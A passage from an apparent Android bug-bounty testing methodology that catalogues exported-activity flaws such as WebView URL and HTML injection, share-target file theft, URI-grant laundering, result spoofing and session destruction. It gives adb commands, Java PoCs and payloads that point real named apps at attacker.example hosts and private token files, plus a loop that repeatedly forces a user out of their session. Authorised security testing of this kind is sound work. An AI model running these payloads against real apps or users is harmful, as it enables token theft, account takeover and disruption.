  supply, **and** that control is not tapjackable (D04-047/-048), **and** no extra shortcuts it. Verified by
  launching with every extra the handler reads and observing no server request until a real touch.

### D04-013 · Debug, developer or internal tooling activity left exported in a release build

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) when it prints tokens |
| **Attacker** | AM-03 |
| **Applies to** | all; React Native and Ionic builds specifically |
| **Maps to** | YesWeHack Android recon guide, "Testing exported activities" (`DebugActivity`: "Debug activities often bypass authentication or reveal sensitive internal state"); React Native `devsupport/DevServerHelper.kt` (bundle URL format, `/inspector/device`, `/open-debugger`) |

- **Test:** Analytics event viewers, feature-flag toggles, environment switchers and framework dev menus.
  The severity is set by whether the screen can **flip an environment or API host** — that rewrites where the
  app sends credentials — or only display configuration.
- **How:**
  ```bash
  grep -nE 'android:exported="true"' out/AndroidManifest.xml -B6 \
    | grep -iE 'dev|debug|inspector|test|playground|qa|staging|flag|config|internal'
  adb shell dumpsys package com.target.app | grep -iE 'devsupport|DevSettings|Inspector'
  adb shell am start -n com.target.app/com.facebook.react.devsupport.DevSettingsActivity
  adb shell am start -n com.target.app/.debug.FeatureFlagActivity
  aapt dump badging base.apk | grep -E "versionName|debuggable"
  ```
- **Proof:** The debug screen rendering on a production build — pair the screenshot with the `versionName`
  from `dumpsys package` so the build identity is in the evidence — started from the zero-permission PoC.
- **Escalation:** A dev activity that changes the JS bundle source at runtime is remote code execution in the
  app's UID -> D17. One that rewrites the API host redirects every subsequent credential -> D14/D15. One that
  writes a persisted setting other components trust -> D23.
- **Ruled out when:** The release manifest contains no such component (the dev activities are in the
  `debug` source set and absent from `dumpsys package` on the release build), or each one is
  `exported="false"` and gated on `BuildConfig.DEBUG` — verified by launching it and receiving
  `Permission Denial` or an immediate `finish()`.

### D04-014 · Fragment injection — an exported activity instantiates a class named in an extra

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | the `PreferenceActivity` path is **LEGACY** (API 19 enforces `isValidFragment()`); the extra-driven class-instantiation pattern applies to all API levels |
| **Maps to** | H1 #43988 (Twitter, **$0 — crash only**); mindedsecurity `MSTG-PLATFORM-2_5` and `MSTG-PLATFORM-2_6`; Google ASI campaign "Fragment Injection" (started 2016-11-29), support page `faqs/answer/7188427`; hackwithsingh sec-14-13 #45, sec-14-19 #14 |

- **Test:** `PreferenceActivity` instantiates by reflection whatever class name arrives in
  `:android:show_fragment`. If the activity is exported and does not override `isValidFragment()` — or
  overrides it as `return true` — any app loads any fragment into it. The modern equivalent is any exported
  "router" activity that does `Fragment.instantiate(...)` or `Class.forName(...)` on an intent-derived name.
- **How:**
  ```bash
  grep -rn 'extends PreferenceActivity' out/sources/
  grep -rn 'isValidFragment' out/sources/          # absent, or "return true", is the finding
  grep -rnE 'Fragment\.instantiate|:android:show_fragment|EXTRA_SHOW_FRAGMENT|Class\.forName\(' out/sources/
  adb shell am start -n com.target.app/.SettingsActivity \
    --es ':android:show_fragment' 'com.target.app.internal.DeveloperFragment'
  adb shell dumpsys activity top | grep -i fragment
  ```
- **Proof:** The internal fragment rendering inside the target app (screenshot plus the `dumpsys activity
  top` fragment line). Calibrate honestly: the Twitter report reached only a reflection crash and paid **$0**
  — a crash PoC does not pay; a fragment that discloses credentials or bypasses a gate does.
- **Escalation:** A fragment hosting a WebView -> D10; a debug or settings fragment -> D22/D13, because debug
  fragments routinely print tokens.
- **Ruled out when:** `isValidFragment()` is overridden with a real allow-list (not `return true`), or the
  app targets >= 19 and does not extend `PreferenceActivity` at all, and no exported component reflects on an
  intent-supplied class name. Prove it by sending a class name outside the allow-list and observing the
  documented `IllegalArgumentException` rather than instantiation.

### D04-015 · Exported activity loads an attacker-supplied URL into a WebView

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the loaded origin yields a session token; `broken_access_control.exposed_sensitive_android_intent` (null) otherwise |
| **Attacker** | AM-03; AM-02 where the same activity is `BROWSABLE` |
| **Applies to** | any app with an exported activity that renders web content |
| **Maps to** | H1 #499348 (Twitter Lite, **Critical**), #283058 (IRCCloud, Medium), #2555949 (US DoD, Medium), #532836 (Exness, Low $400), #694053 (Lark, Medium $1000), #414101 (Shipt, $350), #1737358 (Shopify, Low); Yousef Elsheikh `CheckoutActivity` (Oct 2025); B3nac index "Token leakage due to stolen files via unprotected Activity" (H1 #288955) |

- **Test:** The single highest-yield exported-activity shape in the disclosed corpus. An activity reads a
  string extra and calls `loadUrl()` on it with no scheme or host check.
- **How:**
  ```bash
  # locate the sink, then walk backwards to the extra
  grep -rn 'loadUrl(\|loadData(\|loadDataWithBaseURL(' out/sources/ -B15 \
    | grep -nE 'getStringExtra|getIntent|getQueryParameter'
  ```
  Parameter names worth brute-forcing when the build is obfuscated:
  `url, path, link, redirect, page-url, redirect-url, navigate, partner_url, checkoutUrl, orig_uri, auth_url, extra_url, URL`.
  ```bash
  adb shell am start -n com.irccloud.android/com.irccloud.android.activity.SAMLAuthActivity \
    -e title "IRCCloud: Login Required" -e auth_url "http://attacker.example/"
  adb shell am start -n com.target.app/.CheckoutActivity \
    -es "checkoutUrl" "https://attacker.example/x.html"
  # the file:// variant — this is the one that produced the token theft
  adb shell am start -n com.target.app/.CheckoutActivity \
    -es "checkoutUrl" "file:///data/data/com.target.app/files/PersistedInstallation.json"
  adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity \
    -d "javascript://example.com%0A alert(1);"
  ```
  From a remote page (works in WebViews and Firefox; Chrome blocks the selector form):
  ```html
  <a href="intent://app/feedback#Intent;scheme=mymos;package=com.target.app;S.URL=javascript:(function(){alert('XSS')})();end">Open</a>
  ```
- **Proof:** Your server logging a request from the app's WebView User-Agent, **or** the WebView visibly
  rendering the local file you pointed it at. The severity differentiator at triage is **data egress**, not
  `alert(1)`: Elsheikh's `PersistedInstallation.json` held `auth_token`, `refresh_token` and `user_id` in
  cleartext and yielded a full account takeover valid on mobile *and* web.
- **Escalation:** -> D10 for the bridge and the cookie store; -> D11 for the token file; -> D13 for the
  session replay. File the WebView origin-confusion as its own report (D10) and this activity as the
  primitive — see D04-067.
- **Ruled out when:** The activity resolves the extra against a compiled allow-list of hosts before
  `loadUrl`, with the allow-list checked on `Uri.getHost()` (not `contains`/`startsWith` on the raw string),
  **and** `file://`, `javascript:`, `data:` and `content://` are rejected — verified by sending each scheme
  and observing the load refused. An app that simply has no WebView is also a clean negative; say so.

### D04-016 · Exported activity loads an attacker-supplied HTML **body** into a WebView

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | apps whose WebView host activity accepts both a `url` and an `html` extra |
| **Maps to** | H1 #189793 (Quora, Low as filed, with the escalation ladder documented in the report) |

- **Test:** Worse than a URL extra, because the host check is skipped entirely — your markup executes on the
  origin the app chose.
- **How:**
  ```bash
  grep -rn 'loadDataWithBaseURL(\|loadData(' out/sources/ -B12 | grep -nE 'getStringExtra|getIntent'
  adb shell am start -n com.quora.android/com.quora.android.ActionBarContentActivity \
    -e url 'http://test/test' -e html '<script src=//attacker.example></script>'
  adb shell am start -n com.quora.android/com.quora.android.ModalContentActivity \
    -e url 'http://test/test' -e html '<script>alert(QuoraAndroid.getClipboardData());</script>'
  ```
- **Proof:** Your remote script executing **and** a bridge method returning data — #189793 demonstrated
  `QuoraAndroid.getClipboardData()` returning clipboard contents, which is what made it more than a self-XSS.
- **Escalation:** -> D10. The `addJavascriptInterface` reflection-to-RCE variant is **LEGACY** and requires
  minSdk < 17 (pre-`@JavascriptInterface` enforcement); at minSdk >= 17 the impact is confined to the
  annotated bridge methods, which is normally still enough.
- **Ruled out when:** No `loadData`/`loadDataWithBaseURL` call takes an intent-derived string, or the base
  URL passed with it is `null`/`about:blank` so the content is opaque-origin and no bridge is attached —
  verified by enumerating the bridge objects registered on that WebView and finding none.

### D04-017 · Extra re-launched as an external `ACTION_VIEW` — phishing navigation under the app's identity

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `server_side_injection.content_spoofing.external_authentication_injection` (P4); `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | m_kamal finding #3 (`LoginSelectorActivity`, extra `orig_uri`, field `this.onDemandUrl`) |

- **Test:** Distinct from D04-015: here the app launches an *external* navigation the attacker chose, so the
  phishing page appears to have been opened by the trusted app, at the moment the user tapped the app's own
  normal button.
- **How:**
  ```bash
  grep -rn 'ACTION_VIEW' out/sources/ -B10 | grep -nE 'getStringExtra|Uri\.parse'
  adb shell am start -n com.target.library.activities.LoginSelectorActivity \
    --es orig_uri "https://attacker.example/fake-sso"
  ```
- **Proof:** A screen recording in which the app shows its normal UI, the user taps the normal button, and
  the browser opens the attacker URL. The recording is the report's evidence — the static finding alone will
  be read as an open redirect and closed.
- **Escalation:** Chain with a same-app deep link back into the app to complete a credential-phishing loop
  -> D09/D13. Open redirect alone is on the never-submit list; this is only reportable with the
  trusted-context framing and the recording.
- **Ruled out when:** The URI is validated against an allow-list before `startActivity`, or it is passed to
  an in-app browser with a fixed origin. Also ruled out when the app resolves the intent with a package
  restriction so only the app's own component can handle it.

### D04-018 · Flutter `route` / `dart_entrypoint` / `cached_engine_id` extras on an exported `FlutterActivity`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) if the route renders session data |
| **Attacker** | AM-03 |
| **Applies to** | Flutter apps using `io.flutter.embedding.android.FlutterActivity` (v2 embedding), all current Flutter versions |
| **Maps to** | Flutter `FlutterActivityLaunchConfigs.java` — `EXTRA_INITIAL_ROUTE = "route"`, `EXTRA_DART_ENTRYPOINT = "dart_entrypoint"`, `EXTRA_DART_ENTRYPOINT_ARGS = "dart_entrypoint_args"`, `EXTRA_CACHED_ENGINE_ID = "cached_engine_id"`, `EXTRA_CACHED_ENGINE_GROUP_ID`, `EXTRA_ENABLE_STATE_RESTORATION`; MASTG-TECH-0160 |

- **Test:** `FlutterActivityLaunchConfigs.getInitialRoute()` checks `intent.hasExtra("route")` **first**,
  before manifest metadata. Any exported `FlutterActivity` or subclass — including the default
  `MainActivity` when it carries a `MAIN` or `BROWSABLE` filter — lets a third-party app choose the first
  screen the Dart router renders. Separately, `deepLinkEnabled(metaData)` returns **true when
  `flutter_deeplinking_enabled` is absent**, so a Flutter activity with a `VIEW`/`BROWSABLE` filter hands
  the incoming URI straight to the Dart router with no Java-side allow-listing — which is why testers who
  grep only for Java `getData()` handling wrongly close this surface.
- **How:**
  ```bash
  grep -B5 -A15 'io.flutter.embedding.android.FlutterActivity' out/AndroidManifest.xml
  grep -n 'flutter_deeplinking_enabled' out/AndroidManifest.xml || echo "ABSENT -> deep linking is ENABLED"
  # harvest real route names from the Dart snapshot before guessing
  grep -aoE '"/[a-zA-Z0-9_/-]+"' out_dir/pp.txt | sort -u | head -50
  adb shell am start -n com.target.app/com.target.app.MainActivity -e route "/settings/developer"
  adb shell am start -n com.target.app/com.target.app.MainActivity -e route "/account/transfer?to=attacker"
  adb shell am start -n com.target.app/com.target.app.MainActivity -e dart_entrypoint "debugMain"
  adb shell am start -n com.target.app/com.target.app.MainActivity --esa dart_entrypoint_args "--verbose"
  ```
- **Proof:** A screenshot of the target route rendering without passing the login or PIN gate, issued from
  a zero-permission PoC. For the deep-link half, the URI path appearing as the rendered Dart route with no
  validation in the decompiled `MainActivity`.
- **Escalation:** Route injection plus a route that trusts its query parameters is a one-click state change;
  pair with D09 to reach the same route from a browser link, and with D04-006 because the absence of
  `enforceIntentFilter` is what lets a local app supply an *arbitrary* URI to the same activity.
- **Ruled out when:** The Flutter activities are `exported="false"` and the single exported shell validates
  the URI in Java against a host/path allow-list before handing it to Dart, **and**
  `flutter_deeplinking_enabled` is explicitly `false` where deep linking is not wanted. Verify by sending a
  route name outside the app's own table and observing the router refuse it rather than render a blank page.

### D04-019 · Exported start activity destroys the authenticated session

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `application_level_denial_of_service_dos.high_impact_and_or_medium_difficulty` (P3) if you can hold the user out |
| **Attacker** | AM-03 |
| **Applies to** | apps whose launcher/start activity is `launchMode="singleInstance"` and re-runs startup navigation in `onNewIntent()` |
| **Maps to** | H1 #3764217 (Basecamp, Medium 4.0), #3829030 (Yelp, Low 3.3) |

- **Test:** A `singleInstance` start activity fired externally re-runs its startup navigation and tears down
  the authenticated task. The framing that earned #3764217 its Medium was "reliable and repeatable …
  silent … persistent … no special permissions required".
- **How:**
  ```bash
  grep -nE 'launchMode="singleInstance"' out/AndroidManifest.xml
  # while the app is open and logged in:
  adb shell am start -n com.basecamp.bc3/com.basecamp.bc4.app.main.start.StartActivity \
    --es launchDataUri "https://app.basecamp.com/6217076/projects/47432622"
  # persistence:
  while true; do adb shell am start -n com.target.app/.StartActivity --es launchDataUri "https://…"; sleep 30; done
  ```
- **Proof:** A screen recording showing the app move from an authenticated screen to the sign-in screen
  within the same second, reproducibly, from a caller holding zero permissions.
- **Escalation:** The forced re-login is the pretext for a phishing overlay — combine with D04-047/-050 for
  a credential-capture chain, and with D04-032 if a task hijack is live on the in-scope API levels.
- **Ruled out when:** The start activity checks for an existing session in `onNewIntent` and routes to the
  current screen instead of re-running startup, verified by firing it while authenticated and observing
  `topResumedActivity` unchanged.

### D04-020 · Exported share/receive activity consumes a caller-supplied `EXTRA_STREAM` — and the `/data/user/0/` path-check bypass

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) or `authentication_bypass` (P1) depending on the file |
| **Attacker** | AM-03 |
| **Applies to** | all apps with a `SEND` / `SEND_MULTIPLE` / `GET_CONTENT` receiving activity |
| **Maps to** | H1 #377107 (ownCloud, Medium $750), #161710 (Harvest), #288955 (IRCCloud, **High** — the stolen file held the session token), #258460 (Quora, Medium), #1454002 (ownCloud, $50), #1408692 (Nextcloud) |

- **Test:** Share-target activities take `EXTRA_STREAM` and copy the referenced file somewhere less
  protected — the user's cloud account, public storage, the app's own cache. Point it at the app's own
  private files.
- **How:**
  ```java
  StrictMode.setVmPolicy(new StrictMode.VmPolicy.Builder().build());  // defeat FileUriExposedException
  Intent intent = new Intent("android.intent.action.SEND");
  intent.setClassName("com.owncloud.android",
      "com.owncloud.android.ui.activity.ReceiveExternalFilesActivity");
  intent.setType("*/*");
  intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
  intent.putExtra("android.intent.extra.STREAM",
      Uri.parse("file:///data/user/0/com.owncloud.android/databases/filelist"));
  startActivity(intent);
  ```
  ```bash
  grep -rnE 'EXTRA_STREAM|getParcelableExtra\(|getParcelableArrayListExtra\(' out/sources/ \
    | grep -nE 'openInputStream|FileInputStream|copy'
  ```
- **Proof:** The victim app's private database appearing in the destination the share flow writes to. Name
  the specific file that holds the token — the severity is set by the file, not by the traversal.
- **Escalation:** -> D11 for the token file, -> D07 for the provider path. **The path-check bypass that
  matters:** apps that block `/data/data/` forget the equivalent root. #377107 and #1408692 were both fixed
  with a `startsWith("/data/data/")` check and both bypassed with **`/data/user/0/<pkg>/`**. Always test both
  roots plus `/data/user/<userId>/` for work profiles.
- **Ruled out when:** The activity resolves the URI through `ContentResolver` only, rejects the `file://`
  scheme outright, and canonicalises the path before any allow-list check — verified by sending all three
  roots (`/data/data/…`, `/data/user/0/…`, `/data/user/10/…`) and observing each rejected.

### D04-021 · `android:requireContentUriPermissionFromCaller` absent on an activity that opens a caller-supplied `content://` URI

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | Android 15 / API 35+ for the attribute; the underlying confused deputy works on every version |
| **Maps to** | `guide/topics/manifest/activity-element` (`requireContentUriPermissionFromCaller` values `none` (default) / `read` / `write` / `readOrWrite` / `readAndWrite`, enforced over `Intent.getData()`, `Intent.EXTRA_STREAM` and `Intent.getClipData()`); `about/versions/15/features` (`Context.checkContentUriPermissionFull()`, `ComponentCaller`) |

- **Test:** Android 15 added a manifest-level enforcement that the **caller** must already hold permission
  on any content URI it passes. An exported activity that opens a caller-supplied `content://` URI without
  setting it accepts URIs the caller never had rights to — the classic confused-deputy read, with the
  victim's identity behind it.
- **How:**
  ```bash
  grep -nB4 -A4 'requireContentUriPermissionFromCaller' out/AndroidManifest.xml
  grep -rnE 'getData\(\)|EXTRA_STREAM|getClipData\(\)' out/sources/ | grep -iE 'openInputStream|openFileDescriptor'
  adb shell am start -n com.target.app/.ShareReceiverActivity \
    -a android.intent.action.SEND -t 'text/plain' \
    --eu android.intent.extra.STREAM \
       content://com.target.app.fileprovider/internal/shared_prefs/auth.xml
  ```
- **Proof:** The activity rendering or uploading the contents of a file the *caller* could not read — the
  bytes appearing in the proxy — while a direct `adb shell content read --uri <same>` from the caller's
  context is denied. The contrast is the finding.
- **Escalation:** -> D07 arbitrary content read; chain to a `FileProvider` with an over-broad `<root-path>`.
- **Ruled out when:** The attribute is set to `readOrWrite` or stricter on every URI-consuming activity, or
  the activity calls `Context.checkContentUriPermissionFull()` on the incoming URI before opening it —
  verified by sending a URI the caller does not hold and observing a `SecurityException` in the target's own
  logcat. On a target below API 35 the attribute cannot exist; the correct negative is then a code-level
  check, not the attribute.

### D04-022 · Exported activity returns sensitive data to its caller through `setResult`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) when the returned value is a session token |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | HackTricks README "Sensitive information leakage — activities can also return results … calling the `setResult` method and returning sensitive information"; Hrishikesh C08; Google Invalid Reports "Intended Behavior" (an export is a vulnerability only when it grants unauthorised access) |

- **Test:** An exported, unprotected activity that calls `setResult(RESULT_OK, intent)` with extras hands
  those extras to whichever app invoked it. Most testers only `startActivity()` and never look at the
  return channel.
- **How:**
  ```bash
  grep -rn 'setResult(' out/sources/ -A4 | grep -nE 'putExtra|getExtras'
  ```
  From the zero-permission PoC:
  ```java
  startActivityForResult(new Intent()
      .setClassName("com.target.app","com.target.app.ExportedActivity"), 1);
  @Override protected void onActivityResult(int req, int res, Intent data) {
      Log.i("poc", "res=" + res + " extras=" + (data == null ? null : data.getExtras()));
  }
  ```
- **Proof:** Your PoC's own logcat tag printing a bundle containing a token, account id, PII or an internal
  URI. Rate on what the bundle holds: High Impact Data (auth tokens, credentials, payment/medical/government
  ID) is High to Critical; Low Impact Data (message content, contacts, photos, call/SMS logs, browsing
  history) is Medium.
- **Escalation:** A returned `content://` URI with grant flags is D04-023. A returned token goes straight to
  -> D13 and, if it works from `curl` off-device, -> D15.
- **Ruled out when:** No exported activity calls `setResult` with a non-empty Intent, or every `setResult`
  payload is a boolean/enum with no identifier in it — verified by reading each call site and by the PoC
  receiving `res=0` (`RESULT_CANCELED`) with `data == null`.

### D04-023 · Full-intent echo — `setResult(RESULT_OK, getIntent())` launders URI grants

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); rate on the provider reached |
| **Attacker** | AM-03 |
| **Applies to** | all; the victim's own providers become reachable only where `android:grantUriPermissions="true"` (the `<provider>` default for that attribute is `"false"`) |
| **Maps to** | Oversecured, "Gaining access to arbitrary Content Providers" (four vectors: direct intent return, intent interception, intent manipulation, permission escalation); `risks/intent-redirection` (flag-clearing mitigation list); AOSP §4.3.1 URI permission grants |

- **Test:** A one-line pattern with disproportionate impact. The activity hands you back an Intent whose
  grant flags the framework then honours **on your behalf**. Oversecured's rule: "if it does have access
  rights, then the same rights are transferred to the app to which the Intent is passed." Oversecured chained
  exactly this in TikTok up to arbitrary code execution.
- **How:**
  ```bash
  grep -rn 'setResult(-1, getIntent())\|setResult(.*, *getIntent())' out/sources/
  grep -rn 'setResult(' out/sources/ -A2 | grep -n 'getIntent()'
  grep -rnE 'FLAG_GRANT_(READ|WRITE|PERSISTABLE|PREFIX)_URI_PERMISSION' out/sources/
  ```
  From the attacker activity:
  ```java
  Intent i = new Intent().setClassName("com.target.app","com.target.app.EchoActivity");
  i.setData(Uri.parse("content://com.target.app.provider/secret_data.txt"));   // or content://com.android.contacts/data
  i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
  startActivityForResult(i, 0);
  // onActivityResult: getContentResolver().openInputStream(data.getData())
  ```
- **Proof:** `openInputStream()` returning bytes your app has no permission to read, dumped to your own
  logcat — while the identical call without the round-trip throws `SecurityException`. That contrast is the
  finding.
- **Escalation:** -> D07 provider read/write; the same mechanism reaches the victim's *dangerous-permission*
  data (`READ_CONTACTS`, `READ_SMS`-scoped providers) without holding the permission; a write path goes to
  -> D17 native-library overwrite.
- **Ruled out when:** Every exported activity that returns a result builds a **fresh** Intent and never
  echoes `getIntent()`, and calls `removeFlags(FLAG_GRANT_READ_URI_PERMISSION | FLAG_GRANT_WRITE_URI_PERMISSION
  | FLAG_GRANT_PERSISTABLE_URI_PERMISSION | FLAG_GRANT_PREFIX_URI_PERMISSION)` (or uses
  `androidx.core.content.IntentSanitizer`) before returning. Verify by attempting the read above and
  receiving `SecurityException`.

### D04-024 · Activity result spoofing — the app trusts whatever an implicit responder returns

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); rate on the sink |
| **Attacker** | AM-03 |
| **Applies to** | all apps calling `startActivityForResult`/`registerForActivityResult` with an implicit Intent |
| **Maps to** | MHL Defense Checklist ("Validate all data received in `onNewIntent()` and `onActivityResult()`"); MASTG-TECH-0164 |

- **Test:** The inverse direction of D04-022: the *victim* fires an implicit `ACTION_PICK` /
  `ACTION_GET_CONTENT` / `ACTION_IMAGE_CAPTURE` / OAuth-picker intent and trusts whatever comes back. A
  malicious activity registered for the same action returns a forged result and the victim consumes it.
- **How:**
  ```bash
  grep -rnE 'startActivityForResult\(|registerForActivityResult\(' out/sources/ -A3 \
    | grep -nE 'ACTION_PICK|ACTION_GET_CONTENT|ACTION_IMAGE_CAPTURE|new Intent\("'
  grep -rn 'onActivityResult' out/sources/ -A25 \
    | grep -nE 'getStringExtra|getData\(\)|RESULT_OK|== *-1'
  # discover every app that will answer the same implicit intent
  dz> run app.activity.forintent --action android.intent.action.PICK --data content://x
  ```
  The attacker responder, registered with a high-priority filter for the same action:
  ```java
  setResult(-1, new Intent()
      .putExtra("picked_url", "https://attacker.example/")
      .setData(Uri.parse("file:///data/user/0/com.victim/shared_prefs/secrets.xml")));
  finish();
  ```
- **Proof:** The victim consuming the injected value — the attacker URL loaded into the victim's WebView
  **with auth headers attached**, or the victim copying your `file://` URI into a location you can read.
  Show the victim's own outbound request carrying it.
- **Escalation:** -> D10 (attacker origin in a bridged WebView -> token theft -> ATO); -> D07 where the
  returned URI is a path into the victim's private storage. Note the **BAL gate** in D04-038: on API 34+ the
  victim must have a visible window when it acts on your result.
- **Ruled out when:** `onActivityResult` validates `requestCode` **and** the returned data's scheme and
  authority against an allow-list, and — for privileged flows — verifies the responder's identity rather than
  trusting `resultCode == RESULT_OK`. Prove it by returning a `file://` URI and an off-allow-list host and
  observing both rejected.

### D04-025 · `FLAG_ACTIVITY_FORWARD_RESULT` — the result is delivered to a recipient you chose

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | activities that return results and can be started in the same task |
| **Maps to** | drozer Intent flag map verified in `src/drozer/android.py`: `ACTIVITY_FORWARD_RESULT 0x02000000` |

- **Test:** `FLAG_ACTIVITY_FORWARD_RESULT` makes the new activity return its result to the *original*
  requester rather than to the immediate caller. Against an app that chains activities for a result, this
  lets you re-point the return channel; against an app that uses it internally, it means the recipient of a
  sensitive result is not the component the developer assumed.
- **How:**
  ```bash
  grep -rn 'FLAG_ACTIVITY_FORWARD_RESULT\|0x02000000' out/sources/
  adb shell am start -n com.target.app/.ResultActivity -f 0x02000000
  ```
  ```
  dz> run app.activity.start --component com.target.app com.target.app.ResultActivity \
        --flags ACTIVITY_FORWARD_RESULT
  ```
- **Proof:** The result Intent arriving in a component that never called `startActivityForResult` for it —
  observed with a Frida hook on `Activity.onActivityResult` printing the receiving class, or in your PoC's
  own `onActivityResult`.
- **Escalation:** Most impactful against the activities identified in D04-022 and D04-023, because it changes
  *who* receives the leaked extras or the laundered URI grant.
- **Ruled out when:** No exported activity calls `setResult` (so there is nothing to forward), or every
  internal result chain is built with explicit components inside a single task the caller cannot join —
  verified by launching with the flag and observing the result land where it should.

### D04-026 · `getCallingActivity()` / `getCallingPackage()` used as an authentication signal

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the guarded branch is the auth gate |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | `risks/intent-redirection` — "Checking `getCallingActivity()` returns non-null" is listed verbatim as a common mistake, and "Malicious apps can supply null"; `risks/access-control-to-exported-components` |

- **Test:** Treating a non-null `getCallingActivity()` as proof of a trusted caller. It is populated only for
  `startActivityForResult()`, it is attacker-controlled in content, and an attacker can make it null at will
  by using `startActivity()` instead. Either branch may be the privileged one — test both.
- **How:**
  ```bash
  grep -rn 'getCallingActivity\|getCallingPackage' out/sources/ -A8
  ```
  From the PoC, invoke both ways and log which branch ran:
  ```java
  startActivity(i);                 // getCallingActivity() == null
  startActivityForResult(i, 1);     // getCallingActivity() == your component
  ```
  Hook the branch to see it directly:
  ```bash
  frida -U -n com.target.app -e 'Java.perform(function(){var A=Java.use("com.target.app.GateActivity");A.isTrustedCaller.implementation=function(){var r=this.isTrustedCaller();console.log("isTrustedCaller -> "+r);return r;};});'
  ```
- **Proof:** The privileged branch executing under one of the two invocation styles from an untrusted
  package, with the branch logged.
- **Escalation:** -> D13/D15 auth bypass. The correct construction, worth naming in the remediation, is
  `Binder.getCallingUid()` inside a Service or ContentProvider (D06/D07) followed by
  `PackageManager.getPackagesForUid()` **plus a signature check** — an activity simply cannot obtain a
  trustworthy caller identity before API 35's `ComponentCaller`.
- **Ruled out when:** The activity performs no caller-identity check at all and instead relies on a
  `signature`-level `android:permission` (a real control), or it uses `ComponentCaller`/`getCallingPackage()`
  only for telemetry with no branch depending on it — verified by invoking both ways and observing identical
  behaviour.

### D04-027 · `checkCallingPermission()` called as if it threw — the return value is discarded

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) where the ignored check was the only gate |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | `risks/intent-redirection` — "Assuming `checkCallingPermission()` always throws exceptions (it returns an integer)"; `risks/access-control-to-exported-components` |

- **Test:** `checkCallingPermission()` and `checkCallingOrSelfPermission()` return an `int`
  (`PackageManager.PERMISSION_GRANTED` / `PERMISSION_DENIED`). Code that calls one and does not compare the
  result has no check at all. The throwing variants are `enforceCallingPermission()` /
  `enforceCallingOrSelfPermission()`.
- **How:**
  ```bash
  grep -rn -B2 -A4 'checkCallingPermission\|checkCallingOrSelfPermission' out/sources/
  # the smoking gun: the call on its own statement line
  grep -rnE 'checkCalling(OrSelf)?Permission\([^)]*\)\s*;' out/sources/
  # and the guards that *should* be there
  grep -rnE 'enforceCallingPermission|enforceCallingOrSelfPermission' out/sources/
  ```
- **Proof:** A decompiled statement `checkCallingPermission("com.target.PRIVILEGED");` on its own line,
  followed by the privileged action executing unconditionally — then the action demonstrated from a stub app
  that does **not** hold that permission.
- **Escalation:** The guard the developer believes exists does nothing, so every item from D04-007 onwards
  applies to that component as if it were unprotected.
- **Ruled out when:** Every `check*Permission` result is compared against `PERMISSION_GRANTED` and the
  denial branch returns before the sensitive work, or the component uses the `enforce*` variants — verified
  by calling from a package without the permission and observing `SecurityException` or a clean refusal.

### D04-028 · `singleTask` / `singleTop` re-delivery — `onNewIntent` re-drives an already-authenticated screen

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) for cross-user reads; `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) when it also writes |
| **Attacker** | AM-03 |
| **Applies to** | all; `launchMode` in `singleTop`, `singleTask`, `singleInstance`, `singleInstancePerTask` |
| **Maps to** | `guide/components/activities/tasks-and-back-stack`; `guide/topics/manifest/activity-element` (launchMode table); MHL Defense Checklist |

- **Test:** `singleTask` reuses the existing instance and destroys everything above it, delivering the new
  intent to `onNewIntent()`; `singleTop` does the same when already on top. If the activity's security state
  was established in `onCreate()` but `onNewIntent()` re-reads attacker extras, a second caller re-drives an
  authenticated screen with new parameters — a BOLA in UI form.
- **How:**
  ```bash
  grep -nE 'launchMode="(singleTask|singleTop|singleInstance|singleInstancePerTask)"' out/AndroidManifest.xml
  grep -rn 'onNewIntent' out/sources/ -A25
  # drive it twice: first legitimately, then hostile
  adb shell am start -n com.target.app/.OrderActivity --el orderId 100001
  adb shell am start -n com.target.app/.OrderActivity --el orderId 999999 --ez isAdmin true
  ```
- **Proof:** The screen re-rendering with another user's record, or an admin-only control appearing —
  captured on screen **plus** the corresponding backend request and its `200` in the proxy.
